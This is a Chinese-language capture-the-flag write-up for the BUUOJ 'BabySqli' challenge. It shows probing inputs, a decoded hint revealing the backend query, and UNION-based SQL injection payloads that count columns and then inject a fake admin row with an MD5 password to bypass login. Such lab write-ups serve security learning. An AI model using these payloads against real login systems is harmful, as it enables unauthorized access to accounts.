### buuoj_[GXYCTF2019]BabySqli

这个又是个sql注入题哈，先输入几个数据

```
1.name=admin;pw=1234
wrong pass
2.name=123;pw=1234
wrong user
3.name=1';pw=1234
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1 
4.name=1" or 1=1 #;pw=12345
do not hack me!
```

可以看出，用户肯定有admin，那么思路就有了，就是得到admin的密码，而且再返回界面可以看到这样一串字符

```
<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->
```

不知道是什么加密。。。看了下大佬的wp，发现是先base32再base64

> base32 和 base64 的区别：
> base32 只有大写字母和数字数字组成，或者后面有三个等号。
> base64 只有大写字母和数字，小写字母组成，后面一般是两个等号。

解出来是

```
select * from user where username = '$name'
```

可以使用联合注入测试一下列数

```
1' union select 1,2,3,4#
```

![](https://pic.imgdb.cn/item/611bc34b4907e2d39cad20ba.jpg)

```
1' union select 1,2,3#
```

![](https://pic.imgdb.cn/item/611bc3734907e2d39cadbaa4.jpg)

这就说明一共是三列，测试一下admin也就是user在哪一列

```
1' union select 1,'admin',2#
```

![](https://pic.imgdb.cn/item/611bc3b84907e2d39caec9d8.jpg)

返回错误密码，那么user就是第二列，同样的可以知道password是第三列

然后，然后就卡住了。。。

然后看大佬wp。。。

> **联合注入有个技巧。在联合查询并不存在的数据时，联合查询就会构造一个 虚拟的数据**

意思就是，查询一个不存在的数据，就会新建这个数据，那么，就可以利用这个，创建一个admin用户，从而混淆原来的admin，达到修改admin密码的目的，而且好像password还用了md5加密？？？从哪看出来的。。。

所有构造语句

```
1' union select 1,'admin','	202cb962ac59075b964b07152d234b70'#	#123的MD5加密
```

试了半天发现不行，仔细一看发现是在search.php界面才可以。。。

![](https://pic.imgdb.cn/item/611bc7584907e2d39cbd4230.jpg)

